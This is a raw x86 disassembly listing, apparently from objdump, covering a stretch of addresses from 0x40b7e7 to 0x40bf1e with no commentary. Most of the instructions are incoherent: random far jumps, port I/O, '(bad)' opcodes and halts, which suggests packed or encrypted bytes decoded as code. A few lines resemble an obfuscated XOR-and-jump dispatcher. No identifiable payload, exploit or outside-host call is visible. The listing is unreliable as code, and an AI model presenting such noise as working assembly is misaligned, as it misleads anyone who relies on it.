  40b7e7:	lods   eax,DWORD PTR ds:[esi]
  40b7e8:	inc    esp
  40b7e9:	push   edi
  40b7ea:	out    0x98,eax
  40b7ec:	daa    
  40b7ed:	mov    eax,ds:0xced41c80
  40b7f2:	repz pop ecx
  40b7f4:	aad    0xe3
  40b7f6:	add    ch,BYTE PTR [ecx-0x41715568]
  40b7fc:	ds sbb eax,0xbadcf837
  40b802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b803:	or     eax,0xc0c989d3
  40b808:	dec    ebp
  40b809:	fst    QWORD PTR [eax-0x49]
  40b80c:	int3   
  40b80d:	dec    esi
  40b80e:	pop    edx
  40b80f:	loope  0x40b7f1
  40b811:	stc    
  40b812:	mov    cl,0x36
  40b814:	mov    bh,0x76
  40b816:	dec    esp
  40b817:	pusha  
  40b818:	dec    eax
  40b819:	pop    edx
  40b81a:	enter  0xb1c8,0xa8
  40b81e:	mov    ?,WORD PTR [edx+0x28]
  40b821:	mov    DWORD PTR [esi-0x284ee67a],ecx
  40b827:	mov    al,ds:0x8726fb0b
  40b82c:	mov    bh,0xc8
  40b82e:	mov    bh,0x6a
  40b830:	in     eax,dx
  40b831:	fcom   DWORD PTR [edi+0x4029475f]
  40b837:	mov    ebp,0x97b96f3f
  40b83c:	xor    BYTE PTR [ecx-0x4a96792b],0x97
  40b843:	retf   0x2384
  40b846:	call   0xc943:0x3d086677
  40b84d:	push   0xd3dbe8d2
  40b852:	jl     0x40b7ff
  40b854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b855:	jno    0x40b874
  40b857:	ret    
  40b858:	iret   
  40b859:	push   ebx
  40b85a:	addr16 loope 0x40b7f8
  40b85d:	in     eax,dx
  40b85e:	in     al,0xa7
  40b860:	jne    0x40b8ce
  40b862:	pushf  
  40b863:	jp     0x950f29cd
  40b869:	pop    edx
  40b86a:	repz aas 
  40b86c:	mul    BYTE PTR [esi]
  40b86e:	popf   
  40b86f:	sub    dl,BYTE PTR [eax+0x5ceb72c9]
  40b875:	sbb    DWORD PTR [edx],esi
  40b877:	in     al,dx
  40b878:	mov    dh,0xea
  40b87a:	pop    es
  40b87b:	adc    ecx,esi
  40b87d:	gs cmp eax,0xd2dcd299
  40b883:	cmp    bh,BYTE PTR [ebx]
  40b885:	add    esp,DWORD PTR [edi]
  40b887:	xor    DWORD PTR [eax+0x45],edx
  40b88a:	into   
  40b88b:	ja     0x40b8be
  40b88d:	push   ds
  40b88e:	pop    ds
  40b88f:	stos   DWORD PTR es:[edi],eax
  40b890:	mov    ebx,0xddec254a
  40b895:	repnz outs dx,BYTE PTR ds:[esi]
  40b897:	adc    eax,0x2c4695ce
  40b89c:	push   ebx
  40b89d:	and    ebx,DWORD PTR [esi+0x355270f3]
  40b8a3:	xlat   BYTE PTR ds:[ebx]
  40b8a4:	xor    esp,DWORD PTR [edi+0x3]
  40b8a7:	iret   
  40b8a8:	or     esi,ecx
  40b8aa:	dec    edx
  40b8ab:	push   ecx
  40b8ac:	stc    
  40b8ad:	shr    dh,cl
  40b8af:	add    ah,BYTE PTR [edi-0x557f43b2]
  40b8b5:	inc    edi
  40b8b6:	cmp    BYTE PTR [eax-0x5],al
  40b8b9:	in     al,0x34
  40b8bb:	pusha  
  40b8bc:	mov    bl,0x35
  40b8be:	xor    DWORD PTR [edx],eax
  40b8c0:	mov    gs,WORD PTR [edi+0x697d5c80]
  40b8c6:	stc    
  40b8c7:	pop    ecx
  40b8c8:	cmp    BYTE PTR ds:0x5e2e95a9,0xf4
  40b8cf:	xchg   esi,eax
  40b8d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8d2:	mov    dh,0x43
  40b8d4:	call   0x3d1a:0xfb0a2f4b
  40b8db:	cwde   
  40b8dc:	push   es
  40b8dd:	stc    
  40b8de:	rol    BYTE PTR [eax-0x4179c42a],1
  40b8e4:	hlt    
  40b8e5:	sbb    ch,dh
  40b8e7:	loop   0x40b8b9
  40b8e9:	xadd   eax,esi
  40b8ec:	cwde   
  40b8ed:	and    al,0xee
  40b8ef:	fisubr WORD PTR [edi]
  40b8f1:	xor    esi,DWORD PTR [eax+ebx*1]
  40b8f4:	scas   al,BYTE PTR es:[edi]
  40b8f5:	daa    
  40b8f6:	xlat   BYTE PTR ds:[ebx]
  40b8f7:	lock xor BYTE PTR [ecx+0x6c],bl
  40b8fb:	(bad)  
  40b8fc:	shl    DWORD PTR [ecx+0x75],1
  40b8ff:	mov    BYTE PTR [eax],dh
  40b901:	xchg   dh,bh
  40b903:	cs jle 0x40b8b0
  40b906:	test   al,0x6c
  40b908:	dec    esp
  40b909:	mov    eax,ds:0x12fd6e82
  40b90e:	test   BYTE PTR ds:0x6dba4a68,bl
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	rol    edx,cl
  40b93f:	daa    
  40b940:	rol    dl,cl
  40b942:	(bad)  
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	dec    eax
  40b94b:	bound  eax,QWORD PTR [edx+0x6cc74cb0]
  40b951:	push   0x225c23a7
  40b956:	bound  esi,QWORD PTR [edi-0xe]
  40b959:	pop    esp
  40b95a:	pushf  
  40b95b:	(bad)  
  40b95c:	icebp  
  40b95d:	push   ds
  40b95e:	out    0x33,al
  40b960:	mov    ebx,0x30fd97a8
  40b965:	mov    ebp,0x543372b3
  40b96a:	test   al,0x20
  40b96c:	push   es
  40b96d:	push   0x4e
  40b96f:	pop    edx
  40b970:	es jbe 0x40b912
  40b973:	xchg   edx,eax
  40b974:	mov    bh,0x9c
  40b976:	(bad)  
  40b977:	repnz mov bl,0xfd
  40b97a:	aas    
  40b97b:	push   esp
  40b97c:	push   esi
  40b97d:	xchg   edx,eax
  40b97e:	dec    dx
  40b980:	jmp    eax
  40b982:	and    BYTE PTR [edx+0x57b3019f],ah
  40b988:	fwait
  40b989:	or     BYTE PTR [edx],cl
  40b98b:	ret    
  40b98c:	(bad)  [edx+0x38e787b7]
  40b992:	sub    edx,esp
  40b994:	mov    eax,0x28336e84
  40b999:	(bad)
  40b99d:	xor    bh,BYTE PTR [edx]
  40b99f:	shl    BYTE PTR [ebp-0x2e4a5c71],0x6d
  40b9a6:	push   esp
  40b9a7:	loope  0x40b9a2
  40b9a9:	(bad)  
  40b9aa:	fadd   DWORD PTR [eax+0x33]
  40b9ad:	and    eax,0x40a856fc
  40b9b2:	rol    edx,cl
  40b9b4:	mov    ch,0xe8
  40b9b6:	cld    
  40b9b7:	ret    
  40b9b8:	and    al,0x3e
  40b9ba:	inc    ecx
  40b9bb:	ret    0x6ee9
  40b9be:	(bad)  
  40b9bf:	cmp    al,0xbd
  40b9c1:	(bad)  
  40b9c2:	or     cl,0x17
  40b9c5:	xchg   edx,eax
  40b9c6:	and    DWORD PTR [edx],edi
  40b9c8:	outs   dx,BYTE PTR ds:[esi]
  40b9c9:	push   eax
  40b9ca:	push   edi
  40b9cb:	or     DWORD PTR [ebp+0x1e],ecx
  40b9ce:	mov    ebx,0x17221f7c
  40b9d3:	and    BYTE PTR [ecx-0x6aff3a3],al
  40b9d9:	and    al,0xaa
  40b9db:	xchg   BYTE PTR [ecx-0x7a],dl
  40b9de:	mov    ebp,DWORD PTR [edi*1-0xcf18521]
  40b9e5:	iret   
  40b9e6:	out    dx,eax
  40b9e7:	mov    esi,0xd3869d02
  40b9ec:	sub    BYTE PTR [edx+eiz*8-0x5d],0xca
  40b9f1:	retf   
  40b9f2:	dec    edi
  40b9f3:	mov    ch,0xcb
  40b9f5:	pop    esi
  40b9f6:	mov    ecx,0xcc23deec
  40b9fb:	push   0xc134d46
  40ba00:	jmp    0x9da1:0x74e26fdb
  40ba07:	inc    ebx
  40ba08:	dec    ecx
  40ba09:	or     BYTE PTR [edi+0x1c],bh
  40ba0c:	mov    bh,0x90
  40ba0e:	mov    ah,0xb0
  40ba10:	lock scas al,BYTE PTR es:[edi]
  40ba12:	xchg   DWORD PTR [edx],esp
  40ba14:	and    al,0xdd
  40ba16:	inc    BYTE PTR [edx-0x76b08911]
  40ba1c:	arpl   WORD PTR [ebp+0xec204c2],bx
  40ba22:	inc    eax
  40ba23:	pop    ecx
  40ba24:	scas   al,BYTE PTR es:[edi]
  40ba25:	or     eax,0x150a6814
  40ba2a:	mov    edi,0x77343ede
  40ba2f:	xlat   BYTE PTR ds:[ebx]
  40ba30:	ror    BYTE PTR [edx+0x80f197c],1
  40ba36:	dec    esi
  40ba37:	push   ebp
  40ba38:	sbb    al,0x47
  40ba3a:	add    DWORD PTR [esi-0xe],esp
  40ba3d:	add    al,0x8e
  40ba3f:	adc    edi,ebp
  40ba41:	add    dh,ch
  40ba43:	jmp    0x31a93a8c
  40ba48:	in     al,0x4c
  40ba4a:	xchg   edx,eax
  40ba4b:	or     eax,0xcdec4736
  40ba50:	pop    eax
  40ba51:	mov    ?,esi
  40ba53:	aaa    
  40ba54:	inc    ecx
  40ba55:	jmp    0xde6d1606
  40ba5a:	fs clc 
  40ba5c:	out    0xe4,eax
  40ba5e:	dec    edi
  40ba5f:	push   0x5c167248
  40ba64:	data16 test al,0xed
  40ba67:	push   esi
  40ba68:	shl    BYTE PTR [eax+0x5e3a440a],0x6c
  40ba6f:	mov    ebx,edx
  40ba71:	add    BYTE PTR [ebx],0x4d
  40ba74:	outs   dx,DWORD PTR ds:[esi]
  40ba75:	sbb    DWORD PTR [edx],ebx
  40ba77:	(bad)  
  40ba79:	lock dec esi
  40ba7b:	dec    edx
  40ba7c:	mov    ebp,0xf584d4b9
  40ba81:	in     eax,dx
  40ba82:	xchg   esp,eax
  40ba83:	mov    ebp,0x82f8a179
  40ba89:	inc    esp
  40ba8a:	ret    0xc7ac
  40ba8d:	mov    esp,0x2f3349d
  40ba92:	fld    st(4)
  40ba94:	jno    0x40ba86
  40ba96:	(bad)  
  40ba97:	hlt    
  40ba98:	stos   BYTE PTR es:[edi],al
  40ba99:	pop    ds
  40ba9a:	and    DWORD PTR [edx],esi
  40ba9c:	mov    ch,0xdf
  40ba9e:	stos   DWORD PTR es:[edi],eax
  40ba9f:	popf   
  40baa0:	ss inc ebx
  40baa2:	in     eax,0xca
  40baa4:	sub    al,BYTE PTR [edi+ebx*1+0x62320d59]
  40baab:	daa    
  40baac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baad:	fidiv  DWORD PTR [esi]
  40baaf:	popa   
  40bab0:	mov    ds:0x6edfba3b,al
  40bab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab6:	xor    bl,BYTE PTR [ecx]
  40bab8:	xchg   ecx,eax
  40bab9:	or     ecx,ebp
  40babb:	push   0x9fef6e55
  40bac0:	(bad)  
  40bac1:	cmc    
  40bac2:	clc    
  40bac3:	mov    ah,0x31
  40bac5:	(bad)  
  40bac6:	dec    eax
  40bac7:	mov    ds:0x857aeacc,al
  40bacc:	imul   edi,DWORD PTR [ebx-0x8],0x73
  40bad0:	pop    ecx
  40bad1:	dec    esp
  40bad2:	stc    
  40bad3:	mov    ebx,0xae37658
  40bad8:	pop    es
  40bad9:	cmp    dl,BYTE PTR [edx-0x67]
  40badc:	cmp    eax,DWORD PTR [eax]
  40bade:	xchg   ebp,eax
  40badf:	and    DWORD PTR [ecx],0x54
  40bae2:	sahf   
  40bae3:	je     0x40bad3
  40bae5:	test   BYTE PTR [edx+0x2f],ah
  40bae8:	adc    esp,edx
  40baea:	cmc    
  40baeb:	ins    DWORD PTR es:[edi],dx
  40baec:	and    al,0xf8
  40baee:	clc    
  40baef:	call   0x5f45:0xd932ebee
  40baf6:	mov    esi,0xe276a75a
  40bafb:	outs   dx,BYTE PTR ds:[esi]
  40bafc:	or     DWORD PTR [ebx+0x77e7e9af],0x2e
  40bb03:	xchg   ebp,eax
  40bb04:	jb     0x40bb4c
  40bb06:	loope  0x40bb1b
  40bb08:	fsubr  DWORD PTR [esi]
  40bb0a:	repz shr BYTE PTR [eax-0x21],cl
  40bb0e:	push   ds
  40bb0f:	inc    edi
  40bb10:	fistp  WORD PTR [edi+ebx*8+0x44]
  40bb14:	mov    bh,0x54
  40bb16:	mov    ebx,0xcfc1f0ae
  40bb1b:	dec    ebp
  40bb1c:	xchg   esi,eax
  40bb1d:	ficomp DWORD PTR [ebp+0x79]
  40bb20:	mov    ebx,0x5e5fa14b
  40bb25:	mov    ebx,eax
  40bb27:	jno    0x40bb36
  40bb29:	push   cs
  40bb2a:	shl    BYTE PTR [eax],cl
  40bb2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2d:	mov    esp,DWORD PTR [ebp+edi*2+0x1e599ed4]
  40bb34:	lods   eax,DWORD PTR ds:[esi]
  40bb35:	add    DWORD PTR [ecx+edx*4],edx
  40bb38:	push   ds
  40bb39:	push   edi
  40bb3a:	mov    ch,0x82
  40bb3c:	nop
  40bb3d:	dec    edx
  40bb3e:	xor    ebx,ecx
  40bb40:	outs   dx,DWORD PTR ds:[esi]
  40bb41:	or     al,BYTE PTR [edx+ebx*4]
  40bb44:	imul   ebx,DWORD PTR [edi],0x478a62c
  40bb4a:	ss xchg edx,eax
  40bb4c:	mov    ds:0x3209e01,al
  40bb51:	inc    esi
  40bb52:	retf   0x7f15
  40bb55:	imul   esp,DWORD PTR [ecx+eiz*1-0x35],0xffffffc6
  40bb5a:	jb     0x40bb67
  40bb5c:	sti    
  40bb5d:	clc    
  40bb5e:	push   es
  40bb5f:	gs push esi
  40bb61:	lahf   
  40bb62:	out    dx,al
  40bb63:	and    ebp,edx
  40bb65:	pop    es
  40bb66:	push   ebx
  40bb67:	add    DWORD PTR [ebx+eiz*4+0x441bd20],ebx
  40bb6e:	lea    esp,[ebx+0x2]
  40bb71:	sbb    BYTE PTR [esi],bl
  40bb73:	push   ss
  40bb74:	rcl    DWORD PTR [ebx-0x1e],cl
  40bb77:	inc    eax
  40bb78:	rcl    bl,0x51
  40bb7b:	push   esi
  40bb7c:	js     0x40bb00
  40bb7e:	popa   
  40bb7f:	sahf   
  40bb80:	jns    0x40bb43
  40bb82:	iret   
  40bb83:	out    dx,eax
  40bb84:	xor    BYTE PTR [edi+eiz*4+0x3fe0b824],ah
  40bb8b:	push   ebx
  40bb8c:	cmp    al,0x53
  40bb8e:	xor    eax,0x5e6d021f
  40bb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb94:	mov    cl,0xcf
  40bb96:	mov    cl,0x20
  40bb98:	jnp    0x40bb49
  40bb9a:	push   ebx
  40bb9b:	stc    
  40bb9c:	pop    ds
  40bb9d:	dec    esi
  40bb9e:	(bad)  
  40bb9f:	xchg   esi,eax
  40bba0:	push   ss
  40bba1:	popa   
  40bba2:	push   esp
  40bba3:	stc    
  40bba4:	sti    
  40bba5:	push   0xffffff95
  40bba7:	mov    edx,0xf38ccb1
  40bbac:	jbe    0x40bc19
  40bbae:	outs   dx,DWORD PTR ds:[esi]
  40bbaf:	mov    esp,0xa1127d00
  40bbb4:	pop    ds
  40bbb5:	scas   eax,DWORD PTR es:[edi]
  40bbb6:	jl     0x40bb77
  40bbb8:	sbb    al,0xc4
  40bbba:	nop
  40bbbb:	fimul  DWORD PTR [edi+0xe]
  40bbbe:	or     BYTE PTR [esi+0x62],al
  40bbc1:	inc    ebx
  40bbc2:	inc    edx
  40bbc3:	xor    eax,DWORD PTR [ebx-0x69]
  40bbc6:	neg    esi
  40bbc8:	xor    al,BYTE PTR [ebx-0x2]
  40bbcb:	lock into 
  40bbcd:	imul   ebx,DWORD PTR [esi-0x7d48d7a3],0x8d46db82
  40bbd7:	xchg   ebx,eax
  40bbd8:	xor    esi,DWORD PTR [esi]
  40bbda:	mov    WORD PTR [esp+eiz*8-0x65a2ce74],cs
  40bbe1:	aaa    
  40bbe2:	outs   dx,BYTE PTR ds:[esi]
  40bbe3:	popa   
  40bbe4:	adc    ebx,DWORD PTR [eax]
  40bbe6:	push   eax
  40bbe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe8:	inc    esi
  40bbe9:	push   ebx
  40bbea:	ficom  WORD PTR ds:0x8f632060
  40bbf0:	lods   eax,DWORD PTR ds:[esi]
  40bbf1:	jp     0x40bbef
  40bbf3:	scas   al,BYTE PTR es:[edi]
  40bbf4:	int    0x54
  40bbf6:	dec    edx
  40bbf7:	push   ss
  40bbf8:	out    0x0,eax
  40bbfa:	imul   esp,DWORD PTR [edx+eax*4+0x48],0xffffffb2
  40bbff:	adc    al,0xd5
  40bc01:	push   ebx
  40bc02:	pop    ecx
  40bc03:	dec    ebp
  40bc04:	pop    esp
  40bc05:	int    0x1c
  40bc07:	mov    bh,0x5e
  40bc09:	jle    0x40bbe5
  40bc0b:	hlt    
  40bc0c:	mov    ebp,0x71da0792
  40bc11:	imul   eax,ecx,0x6bac9565
  40bc17:	rcr    ah,cl
  40bc19:	inc    eax
  40bc1a:	aas    
  40bc1b:	jg     0x40bc7e
  40bc1d:	icebp  
  40bc1e:	push   0xffffffe3
  40bc20:	(bad)  
  40bc21:	dec    ecx
  40bc22:	out    dx,al
  40bc23:	dec    edi
  40bc24:	mov    cl,0x8e
  40bc26:	daa    
  40bc27:	minps  xmm1,xmm2
  40bc2a:	ja     0x40bc4f
  40bc2c:	pop    edi
  40bc2d:	ror    BYTE PTR [eax],1
  40bc2f:	sbb    eax,0x658a7488
  40bc34:	jmp    0x882e:0xa25fae2f
  40bc3b:	add    eax,edi
  40bc3d:	inc    esi
  40bc3e:	mov    ah,0xe5
  40bc40:	fbld   TBYTE PTR [edx+0x68]
  40bc43:	cmp    ebp,ebx
  40bc45:	jns    0x40bbd2
  40bc47:	inc    ebp
  40bc48:	hlt    
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc43
  40bc7d:	(bad)  
  40bc7e:	gs mov ebx,0x787891c2
  40bc84:	je     0x40bd04
  40bc86:	js     0x40bd00
  40bc88:	pop    edx
  40bc89:	(bad)  
  40bc8a:	or     al,0xe4
  40bc8c:	lock (bad) 
  40bc8e:	cmc    
  40bc8f:	mov    dh,0x3e
  40bc91:	(bad)  
  40bc92:	push   ecx
  40bc93:	mov    ah,BYTE PTR [eax-0x64]
  40bc96:	arpl   bp,dx
  40bc98:	mov    WORD PTR [eax-0x10],cs
  40bc9b:	jg     0x40bcc0
  40bc9d:	sub    edx,DWORD PTR [eax-0x1a3ebf7d]
  40bca3:	lods   eax,DWORD PTR ds:[esi]
  40bca4:	pusha  
  40bca5:	mov    esp,0x1ead6be2
  40bcaa:	or     al,0x8c
  40bcac:	ins    DWORD PTR es:[edi],dx
  40bcad:	dec    ecx
  40bcae:	xchg   ebp,eax
  40bcaf:	and    eax,DWORD PTR [eax-0x72bbc341]
  40bcb5:	pop    ss
  40bcb6:	ins    DWORD PTR es:[edi],dx
  40bcb7:	jmp    0x463d:0x2e2573fb
  40bcbe:	inc    ebp
  40bcbf:	and    eax,0x3c9d0a83
  40bcc4:	dec    ebp
  40bcc5:	push   es
  40bcc6:	adc    al,0xc9
  40bcc8:	jns    0x40bcf4
  40bcca:	inc    ebx
  40bccb:	aas    
  40bccc:	sbb    al,0x44
  40bcce:	cmp    esp,esi
  40bcd0:	aaa    
  40bcd1:	xchg   BYTE PTR [ecx+0x1f],ah
  40bcd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcd5:	adc    dh,dh
  40bcd7:	int    0x25
  40bcd9:	mov    al,0xdb
  40bcdb:	inc    ecx
  40bcdc:	and    esi,DWORD PTR [edx+0x7cb15e47]
  40bce2:	loop   0x40bd50
  40bce4:	rcr    ecx,0xa4
  40bce7:	out    dx,al
  40bce8:	out    dx,eax
  40bce9:	pop    ebp
  40bcea:	pop    ebx
  40bceb:	mov    eax,0x37b82ae7
  40bcf0:	sbb    eax,0x8cca5921
  40bcf5:	sbb    al,0x72
  40bcf7:	nop
  40bcf8:	cli    
  40bcf9:	(bad)  
  40bcfa:	popa   
  40bcfb:	fwait
  40bcfc:	ja     0x40bcc9
  40bcfe:	cmp    al,0x29
  40bd00:	fsubr  DWORD PTR [ebx+0x373caa86]
  40bd06:	push   edi
  40bd07:	dec    edx
  40bd08:	jns    0x40bd45
  40bd0a:	mov    ?,ebx
  40bd0c:	(bad)  
  40bd0d:	das    
  40bd0e:	and    cl,0x3b
  40bd11:	inc    edx
  40bd12:	adc    ah,dh
  40bd14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd15:	push   ds
  40bd16:	loopne 0x40bcf8
  40bd18:	repnz retf 0xc498
  40bd1c:	or     al,0xe1
  40bd1e:	jne    0x40bcad
  40bd20:	retf   
  40bd21:	in     eax,dx
  40bd22:	mov    esi,edx
  40bd24:	mov    eax,ds:0xff924e2c
  40bd29:	inc    esp
  40bd2a:	xchg   ebp,ecx
  40bd2c:	or     cl,BYTE PTR [edx+0x6814054d]
  40bd32:	jno    0x40bcc2
  40bd34:	sti    
  40bd35:	adc    eax,0x9bc82303
  40bd3a:	or     ah,dh
  40bd3c:	sub    dh,BYTE PTR [eax]
  40bd3e:	ins    DWORD PTR es:[edi],dx
  40bd3f:	lsl    esi,WORD PTR [edx+0x33]
  40bd43:	stos   BYTE PTR es:[edi],al
  40bd44:	js     0x40bd84
  40bd46:	and    eax,0xd5cbbeb6
  40bd4b:	int    0x68
  40bd4d:	js     0x40bd2d
  40bd4f:	test   BYTE PTR [esi+edi*8-0x4534b2e3],0xce
  40bd57:	scas   eax,DWORD PTR es:[edi]
  40bd58:	jg     0x40bd21
  40bd5a:	or     eax,0x6c3bcba8
  40bd5f:	in     al,0xce
  40bd61:	ins    DWORD PTR es:[edi],dx
  40bd62:	or     DWORD PTR [esi+0x1b],ecx
  40bd65:	pop    esp
  40bd66:	into   
  40bd67:	hlt    
  40bd68:	or     ebp,DWORD PTR [ebx+0x39e36537]
  40bd6e:	xor    ebx,DWORD PTR [edx]
  40bd70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd71:	dec    esi
  40bd72:	popa   
  40bd73:	inc    DWORD PTR [ebp+0x409e5ac6]
  40bd79:	push   ds
  40bd7a:	dec    ecx
  40bd7b:	mov    dh,0xb1
  40bd7d:	fcmove st,st(0)
  40bd7f:	xchg   ecx,eax
  40bd80:	int    0x51
  40bd82:	fs inc edi
  40bd84:	jbe    0x40bd89
  40bd86:	fld    QWORD PTR [esi+0x32e1b92b]
  40bd8c:	push   ecx
  40bd8d:	test   eax,0x74d32663
  40bd92:	out    dx,al
  40bd93:	lods   eax,DWORD PTR ds:[esi]
  40bd94:	ins    BYTE PTR es:[edi],dx
  40bd95:	xchg   edi,eax
  40bd96:	shr    BYTE PTR [ebx+0x73],cl
  40bd99:	jge    0x40bd2a
  40bd9b:	stos   BYTE PTR es:[edi],al
  40bd9c:	mov    edi,0xe06a1a9
  40bda1:	add    dh,0xe8
  40bda4:	push   cs
  40bda5:	in     al,0xbf
  40bda7:	lahf   
  40bda8:	inc    esi
  40bda9:	mov    ebx,0xc2b8e4a2
  40bdae:	loope  0x40bd5e
  40bdb0:	aaa    
  40bdb1:	sahf   
  40bdb2:	mov    ds:0xe4908a6,eax
  40bdb8:	leave  
  40bdb9:	xchg   ebp,eax
  40bdba:	mov    dh,bl
  40bdbc:	xor    DWORD PTR [eax-0x23],esp
  40bdbf:	adc    eax,0xac768bb
  40bdc4:	jl     0x40bdba
  40bdc6:	push   esi
  40bdc7:	pop    si
  40bdc9:	and    al,0xdd
  40bdcb:	ds jmp 0xb4547606
  40bdd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdd2:	xor    edi,DWORD PTR [ecx+0x727bd6f4]
  40bdd8:	mov    ebx,0xc9656f31
  40bddd:	repz mov cl,dl
  40bde0:	or     BYTE PTR [ecx+0x52],dl
  40bde3:	sub    BYTE PTR [edx],ch
  40bde5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bde6:	pop    es
  40bde7:	je     0x40bdb6
  40bde9:	mov    ecx,ecx
  40bdeb:	(bad)  
  40bdec:	je     0x40bde0
  40bdee:	int    0xc6
  40bdf0:	ret    
  40bdf1:	std    
  40bdf2:	jne    0x40bdb6
  40bdf4:	or     al,0x27
  40bdf6:	sub    eax,0x2d0e8f61
  40bdfb:	xor    bh,BYTE PTR [edx-0x6d]
  40bdfe:	pop    edi
  40bdff:	push   ds
  40be00:	retf   0x2aba
  40be03:	adc    al,0x9a
  40be05:	add    ch,dh
  40be07:	lahf   
  40be08:	xchg   DWORD PTR [ebx+0xada7c83],edi
  40be0e:	sti    
  40be0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be10:	jnp    0x40bdb1
  40be12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be13:	gs loope 0x40be76
  40be16:	popa   
  40be17:	ror    DWORD PTR ds:0x8372cc20,1
  40be1d:	clc    
  40be1e:	sub    eax,0x8590c589
  40be23:	mov    esi,0xf14b5993
  40be28:	(bad)  
  40be29:	out    0x19,al
  40be2b:	push   0x93c9e5cf
  40be30:	js     0x40bdc9
  40be32:	pop    ss
  40be33:	sub    BYTE PTR [ebx-0x7adb50b8],cl
  40be39:	push   edi
  40be3a:	mov    ds,edi
  40be3c:	mov    bh,0xf9
  40be3e:	sbb    DWORD PTR [edx+edx*1-0xc],esp
  40be42:	sbb    eax,edx
  40be44:	dec    eax
  40be45:	icebp  
  40be46:	adc    ah,bl
  40be48:	imul   ebx,DWORD PTR [ecx-0x9],0x712bdffa
  40be4f:	icebp  
  40be50:	aad    0xed
  40be52:	add    bh,ah
  40be54:	fs pop ds
  40be56:	jecxz  0x40be72
  40be58:	sub    al,0xd0
  40be5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be5b:	int3   
  40be5c:	or     ah,BYTE PTR [ecx+eiz*4]
  40be5f:	add    DWORD PTR [edi+0x206055d0],ecx
  40be65:	pop    ss
  40be66:	ins    DWORD PTR es:[edi],dx
  40be67:	adc    eax,0xf62fd644
  40be6c:	scas   eax,DWORD PTR es:[edi]
  40be6d:	mov    ecx,0xe1239ed5
  40be72:	sbb    al,0x60
  40be74:	mov    esp,0xc13bf10
  40be79:	and    bl,BYTE PTR [ecx+esi*1-0x77d436f5]
  40be80:	int    0x7
  40be82:	mov    ss,WORD PTR [edi]
  40be84:	fiadd  DWORD PTR [eax+0x12]
  40be87:	mov    eax,ds:0xc666f89e
  40be8c:	sub    DWORD PTR [edi+0x6f88870b],0xfe955b00
  40be96:	dec    esi
  40be97:	cwde   
  40be98:	dec    ebp
  40be99:	add    dl,dh
  40be9b:	gs in  eax,0x52
  40be9e:	mov    al,ds:0xff4f11cd
  40bea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bea4:	jae    0x40bf0b
  40bea6:	xor    bh,BYTE PTR [ecx-0x49624269]
  40beac:	ret    0x2854
  40beaf:	stc    
  40beb0:	rcr    ah,0x5
  40beb3:	mov    dl,0x62
  40beb5:	or     al,0x9c
  40beb7:	mov    BYTE PTR [ecx-0x4a9efc63],dh
  40bebd:	(bad)  
  40bebe:	cwde   
  40bebf:	popf   
  40bec0:	ins    BYTE PTR es:[edi],dx
  40bec1:	jb     0x40be9a
  40bec3:	loop   0x40beed
  40bec5:	bound  esi,QWORD PTR [ebp-0x6c7da659]
  40becb:	add    BYTE PTR [ecx+eiz*8+0x4f2009c9],0xc5
  40bed3:	ins    BYTE PTR es:[edi],dx
  40bed4:	cmp    ecx,ecx
  40bed6:	mov    ah,0x4f
  40bed8:	inc    edi
  40bed9:	mov    dl,0x44
  40bedb:	push   ds
  40bedc:	je     0x40bf59
  40bede:	iret   
  40bedf:	dec    eax
  40bee0:	iret   
  40bee1:	test   eax,0x30ed20b8
  40bee6:	scas   eax,DWORD PTR es:[edi]
  40bee7:	test   al,0xfd
  40bee9:	inc    edx
  40beea:	sub    eax,0x80754832
  40beef:	sbb    al,0x1
  40bef1:	mov    bl,0xb0
  40bef3:	mov    edx,0xff397fd3
  40bef8:	mov    bl,0x6e
  40befa:	xchg   cl,ch
  40befc:	mov    al,0xae
  40befe:	pop    esp
  40beff:	push   es
  40bf00:	pop    esi
  40bf01:	ror    BYTE PTR [edx+0x67],cl
  40bf04:	icebp  
  40bf05:	pop    edx
  40bf06:	mov    WORD PTR ds:[ebp-0x46],ds
  40bf0a:	add    DWORD PTR [edi-0x5e998ae],edi
  40bf10:	jae    0x40bf67
  40bf12:	ins    BYTE PTR es:[edi],dx
  40bf13:	push   eax
  40bf14:	mov    esp,0x5aa37b51
  40bf19:	adc    eax,0x51c96441
  40bf1e:	outs   dx,BYTE PTR ds:[esi]
